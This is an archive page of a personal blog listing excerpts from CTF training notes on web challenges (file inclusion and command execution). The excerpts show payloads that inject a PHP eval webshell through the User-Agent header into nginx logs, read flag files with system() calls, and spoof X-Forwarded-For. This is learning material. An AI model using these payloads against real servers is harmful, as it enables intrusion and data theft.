<!DOCTYPE html><html class="appearance-auto" lang="zh-CN"><head><meta charset="UTF-8"><title>HildegardeZ's blog</title><meta name="description" content="What doesn't kill me makes me stronger."><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/widget-post-list.css"><meta name="generator" content="Hexo 5.4.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">HildegardeZ's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><span>归档 · 2021</span></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">首页</a></h3><h3 class="is-inline-block"><a href="/about">关于</a></h3><h3 class="is-inline-block"><a href="/archives">归档</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">首页</a></h3><h3 class="is-inline-block"><a href="/about">关于</a></h3><h3 class="is-inline-block"><a href="/archives">归档</a></h3></header><main><article class="post-container is-flex is-justify-content-center section container is-max-widescreen pt-4 px-2"><div class="columns is-variable is-1-tablet is-3-desktop-only is-2-widescreen is-full-width"><section class="column"><article class="post-item-card"><section class="content post-card-content p-4 pb-5"><header><a href="/tags/%E5%AE%9E%E8%AE%AD2021"><i class="tag post-item-tag">实训2021</i></a></header><h2 class="mt-4 mb-0 is-family-serif"><a href="/2021/07/17/%E5%AE%9E%E8%AE%AD7-15/">实训7.15</a></h2><time class="has-text-grey" datetime="2021-07-17T04:26:57.401Z">2021-07-17</time><p class="is-flex-grow-2 mt-2">bugkuweb source考察扫描 分析
wp
</p><a class="button is-default mt-2 has-text-weight-semibold" href="/2021/07/17/%E5%AE%9E%E8%AE%AD7-15/">更多</a></section></article><article class="post-item-card"><section class="content post-card-content p-4 pb-5"><h2 class="mt-4 mb-0 is-family-serif"><a href="/2021/07/17/hello-world/">Hello World</a></h2><time class="has-text-grey" datetime="2021-07-17T03:50:04.961Z">2021-07-17</time><p class="is-flex-grow-2 mt-2">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
Quick StartCreate a new post1$ hexo new &amp;quot;My New Post&amp;quot;

More info: Writing
Run server1$ hexo server

More info: Server
Generate static files1$ hexo genera..</p><a class="button is-default mt-2 has-text-weight-semibold" href="/2021/07/17/hello-world/">更多</a></section></article><article class="post-item-card"><header class="is-relative is-flex"><div class="post-cover-backdrop is-hidden"><img src="/2021/07/16/%E5%AE%9E%E8%AE%AD7-16/hexo\source_posts\实训7-16\QQ截图20210723222345.png" alt="loading.."></div><a class="post-cover-link has-text-centered skeleton" href="/2021/07/16/%E5%AE%9E%E8%AE%AD7-16/"><img class="post-cover-img js-img-fadeIn" src="/2021/07/16/%E5%AE%9E%E8%AE%AD7-16/hexo\source_posts\实训7-16\QQ截图20210723222345.png" alt="loading.." data-backdrop="true"></a></header><section class="content post-card-content p-4 pb-5"><header><a href="/tags/%E5%AE%9E%E8%AE%AD2021"><i class="tag post-item-tag">实训2021</i></a></header><h2 class="mt-4 mb-0 is-family-serif"><a href="/2021/07/16/%E5%AE%9E%E8%AE%AD7-16/">实训7.16</a></h2><time class="has-text-grey" datetime="2021-07-16T03:42:06.000Z">2021-07-16</time><p class="is-flex-grow-2 mt-2">2021/7/16
文件包含web81
新增屏蔽:
url和ua里的php不转码

修改UA头 执行
1&amp;lt;?=eval($_POST[1]);?&amp;gt; //php被过滤

关闭UA头 文件包含
12url/?file=/var/log/nginx/access.logpost data: 1=system(&amp;#x27;ls&amp;#x27;);

flag在fl0g.php里
1post data:1=system(&amp;#x27;tac fl0g.php&amp;#x27;);

web82
新增屏蔽.
php里没有后缀名的可控制文件只有session

可以发现，存在一个文件包含漏洞，但是找不到一个可以包含的恶意文件。其实，我们可以利用session.upload_progress将恶意语句写入session文件..</p><a class="button is-default mt-2 has-text-weight-semibold" href="/2021/07/16/%E5%AE%9E%E8%AE%AD7-16/">更多</a></section></article><article class="post-item-card"><header class="is-relative is-flex"><div class="post-cover-backdrop is-hidden"><img src="/2021/07/14/%E5%AE%9E%E8%AE%AD7-14/QQ%E6%88%AA%E5%9B%BE20210714172108.png" alt="loading.."></div><a class="post-cover-link has-text-centered skeleton" href="/2021/07/14/%E5%AE%9E%E8%AE%AD7-14/"><img class="post-cover-img js-img-fadeIn" src="/2021/07/14/%E5%AE%9E%E8%AE%AD7-14/QQ%E6%88%AA%E5%9B%BE20210714172108.png" alt="loading.." data-backdrop="true"></a></header><section class="content post-card-content p-4 pb-5"><header><a href="/tags/%E5%AE%9E%E8%AE%AD2021"><i class="tag post-item-tag">实训2021</i></a></header><h2 class="mt-4 mb-0 is-family-serif"><a href="/2021/07/14/%E5%AE%9E%E8%AE%AD7-14/">实训7.14</a></h2><time class="has-text-grey" datetime="2021-07-14T09:16:23.000Z">2021-07-14</time><p class="is-flex-grow-2 mt-2">2021/7/14
昨天hexo s能显示图片了 部署一晚上没整出来
今天删了重装 删了重装 好了 口合口合
重装（散装）虚拟机 装了kali
重装burpsuitepro 就是每次开机有点怪 但是懒得删了再来了 直接jdk运行吧不然毁灭吧我累惹
bugkuweb本地管理员
考察XFF绕过

username直接试admin 不论输入啥都是“ip禁止访问”
甚至数了一下有5000个n试了试密码5000
看wp 终于在犄角旮旯源代码n的末尾找到一串base64编码解得test123

用户名admin 密码test123 用burpsuite抓包修改用户头后重放
123Accept-Encoding: gzip, deflateX-Forwarded-For: 127.0.0.1 //加这一行Content-..</p><a class="button is-default mt-2 has-text-weight-semibold" href="/2021/07/14/%E5%AE%9E%E8%AE%AD7-14/">更多</a></section></article><article class="post-item-card"><header class="is-relative is-flex"><div class="post-cover-backdrop is-hidden"><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-13/img-1607482972732af93016f108d3cdb06d0f5fcd5929930.jpg" alt="loading.."></div><a class="post-cover-link has-text-centered skeleton" href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-13/"><img class="post-cover-img js-img-fadeIn" src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-13/img-1607482972732af93016f108d3cdb06d0f5fcd5929930.jpg" alt="loading.." data-backdrop="true"></a></header><section class="content post-card-content p-4 pb-5"><header><a href="/tags/%E5%AE%9E%E8%AE%AD2021"><i class="tag post-item-tag">实训2021</i></a></header><h2 class="mt-4 mb-0 is-family-serif"><a href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-13/">实训7.13</a></h2><time class="has-text-grey" datetime="2021-07-13T05:57:39.000Z">2021-07-13</time><p class="is-flex-grow-2 mt-2">/test
test

1test



</p><a class="button is-default mt-2 has-text-weight-semibold" href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-13/">更多</a></section></article><article class="post-item-card"><header class="is-relative is-flex"><div class="post-cover-backdrop is-hidden"><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-12/image-20210712094647901.png" alt="loading.."></div><a class="post-cover-link has-text-centered skeleton" href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-12/"><img class="post-cover-img js-img-fadeIn" src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-12/image-20210712094647901.png" alt="loading.." data-backdrop="true"></a></header><section class="content post-card-content p-4 pb-5"><header><a href="/tags/%E5%AE%9E%E8%AE%AD2021"><i class="tag post-item-tag">实训2021</i></a></header><h2 class="mt-4 mb-0 is-family-serif"><a href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-12/">实训7.12</a></h2><time class="has-text-grey" datetime="2021-07-13T01:49:07.000Z">2021-07-13</time><p class="is-flex-grow-2 mt-2">2021/7/12
文件包含web80
data和php协议都不能用了

日志包含
1234567修改user agent: &amp;lt;?php eval($_POST[1]);?&amp;gt; 执行 然后url/?file=/var/log/nginx/access.log post data: 1=system(&amp;quot;ls&amp;quot;); 查看文件目录 发现flag在fl0g.php里最后post data: 1=system(&amp;quot;tac fl0g.php&amp;quot;);

web81
新增屏蔽：

80方法可用
关于url转码 只有get请求里被php包含才会转码 比如UA头里不转码

</p><a class="button is-default mt-2 has-text-weight-semibold" href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-12/">更多</a></section></article><article class="post-item-card"><header class="is-relative is-flex"><div class="post-cover-backdrop is-hidden"><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-10/QQ%E6%88%AA%E5%9B%BE20210710145829.png" alt="loading.."></div><a class="post-cover-link has-text-centered skeleton" href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-10/"><img class="post-cover-img js-img-fadeIn" src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-10/QQ%E6%88%AA%E5%9B%BE20210710145829.png" alt="loading.." data-backdrop="true"></a></header><section class="content post-card-content p-4 pb-5"><header><a href="/tags/%E5%AE%9E%E8%AE%AD2021"><i class="tag post-item-tag">实训2021</i></a></header><h2 class="mt-4 mb-0 is-family-serif"><a href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-10/">实训7.10</a></h2><time class="has-text-grey" datetime="2021-07-13T01:48:30.000Z">2021-07-13</time><p class="is-flex-grow-2 mt-2">2021/7/10
命令执行web75-76
读取目录 脚本绕过限制
1c=$a=new DirectoryIterator(&amp;#x27;glob:///*&amp;#x27;);foreach($a as $f)&amp;#123;echo($f-&amp;gt;__toString().&amp;quot; &amp;quot;);&amp;#125;;exit();

flag在flag36.txt里
利用mysql查询
1c=try &amp;#123;$dbh = new PDO(&amp;#x27;mysql:host=localhost;dbname=ctftraining&amp;#x27;, &amp;#x27;root&amp;#x27;,&amp;#x27;root&amp;#x27;);foreach($dbh-&amp;gt;query(&amp;#x27;select load_file(&amp;quo..</p><a class="button is-default mt-2 has-text-weight-semibold" href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-10/">更多</a></section></article><article class="post-item-card"><header class="is-relative is-flex"><div class="post-cover-backdrop is-hidden"><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-9/image-20210709093745897.png" alt="loading.."></div><a class="post-cover-link has-text-centered skeleton" href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-9/"><img class="post-cover-img js-img-fadeIn" src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-9/image-20210709093745897.png" alt="loading.." data-backdrop="true"></a></header><section class="content post-card-content p-4 pb-5"><header><a href="/tags/%E5%AE%9E%E8%AE%AD2021"><i class="tag post-item-tag">实训2021</i></a></header><h2 class="mt-4 mb-0 is-family-serif"><a href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-9/">实训7.9</a></h2><time class="has-text-grey" datetime="2021-07-13T01:48:10.000Z">2021-07-13</time><p class="is-flex-grow-2 mt-2">2021/7/9
命令执行web58-63
没有过滤但是有禁用函数

hackbar post data测试函数 可用有
123- c=show_source(&amp;#x27;flag.php&amp;#x27;); //读取文件- c=file_get_contents(&amp;#x27;flag.php&amp;#x27;);- c=highlight_file(&amp;#x27;flag.php&amp;#x27;); //通用，没有被禁




读取文件函数 
highlight_file($filename);show_source($filename);print_r(php_strip_whitespace($filename));print_r(file_get_contents($filename));readfile($fil..</p><a class="button is-default mt-2 has-text-weight-semibold" href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-9/">更多</a></section></article><article class="post-item-card"><header class="is-relative is-flex"><div class="post-cover-backdrop is-hidden"><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-8/image-20210708085022554.png" alt="loading.."></div><a class="post-cover-link has-text-centered skeleton" href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-8/"><img class="post-cover-img js-img-fadeIn" src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-8/image-20210708085022554.png" alt="loading.." data-backdrop="true"></a></header><section class="content post-card-content p-4 pb-5"><header><a href="/tags/%E5%AE%9E%E8%AE%AD2021"><i class="tag post-item-tag">实训2021</i></a></header><h2 class="mt-4 mb-0 is-family-serif"><a href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-8/">实训7.8</a></h2><time class="has-text-grey" datetime="2021-07-13T01:47:53.000Z">2021-07-13</time><p class="is-flex-grow-2 mt-2">2021/7/8
命令执行（上头）
web42
【给翻译翻译什么叫黑洞】就是不会保存

1：&amp;gt; 代表重定向到哪里，例如：echo “123” &amp;gt; /home/123.txt2：/dev/null 代表空设备文件3：2&amp;gt; 表示stderr标准错误4：&amp;amp; 表示等同于的意思，2&amp;gt;&amp;amp;1，表示2的输出重定向等同于15：1 表示stdout标准输出，系统默认值是1，所以”&amp;gt;/dev/null”等同于 “1&amp;gt;/dev/null”因此，&amp;gt;/dev/null 2&amp;gt;&amp;amp;1 也可以写成“1&amp;gt; /dev/null 2&amp;gt; &amp;amp;1”
那么本文标题的语句执行过程为：1&amp;gt;/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信..</p><a class="button is-default mt-2 has-text-weight-semibold" href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-8/">更多</a></section></article><article class="post-item-card"><header class="is-relative is-flex"><div class="post-cover-backdrop is-hidden"><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-7/image-20210707112056235.png" alt="loading.."></div><a class="post-cover-link has-text-centered skeleton" href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-7/"><img class="post-cover-img js-img-fadeIn" src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-7/image-20210707112056235.png" alt="loading.." data-backdrop="true"></a></header><section class="content post-card-content p-4 pb-5"><header><a href="/tags/%E5%AE%9E%E8%AE%AD2021"><i class="tag post-item-tag">实训2021</i></a></header><h2 class="mt-4 mb-0 is-family-serif"><a href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-7/">实训7.7</a></h2><time class="has-text-grey" datetime="2021-07-13T01:38:46.000Z">2021-07-13</time><p class="is-flex-grow-2 mt-2">2021/7/7
命令执行web38
题目提示：nginx的日志文件/var/log/nginx/access.log

替换
1url/?c=data://text/plain,&amp;lt;?=system(&amp;quot;cp fla*.* 1.txt&amp;quot;);?&amp;gt;  url/1.txt 得到源代码


</p><a class="button is-default mt-2 has-text-weight-semibold" href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-7/">更多</a></section></article><section class="paginator is-flex is-justify-content-flex-end is-flex-wrap-wrap mt-5"><span class="page-number current">1</span><a class="page-number" href="/archives/2021/07/page/2/">2</a><a class="extend next" rel="next" href="/archives/2021/07/page/2/"><i class="iconfont icon-next has-text-grey"></i></a></section></section><aside class="column is-hidden-mobile is-4-tablet is-3-widescreen"><div style="position: sticky; top: 50px;"><main class="aside-card-container archives-widget is-in-archive-page"><h3>归档</h3><section><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">七月 2021</a><span class="archive-list-count">13</span></li></ul></section></main></div></aside></div></article><script>$claudia.fadeInImage(null, $claudia.blurBackdropImg)

window.addEventListener('resize', $claudia.throttle(function () {
    var images = document.querySelectorAll('.js-img-fadeIn')

    images.forEach($claudia.blurBackdropImg)
}, 150))</script></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com//"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/HildegardeZ"><i class="iconfont icon-github"></i></a><!-- Ins--><a title="instagram" target="_blank" rel="noopener nofollow" href="//www.instagram.com//"><i class="iconfont icon-ins"></i></a><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--><a title="facebook" target="_blank" rel="noopener nofollow" href="//www.facebook.com//"><i class="iconfont icon-tian7_facebook"></i></a></section><p><span>Copyright ©</span><span> HildegardeZ 2022</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script>$claudia.fadeInImage(null, $claudia.blurBackdropImg)

window.addEventListener('resize', $claudia.throttle(function () {
    var images = document.querySelectorAll('.js-img-fadeIn')

    images.forEach($claudia.blurBackdropImg)
}, 150))</script></body></html>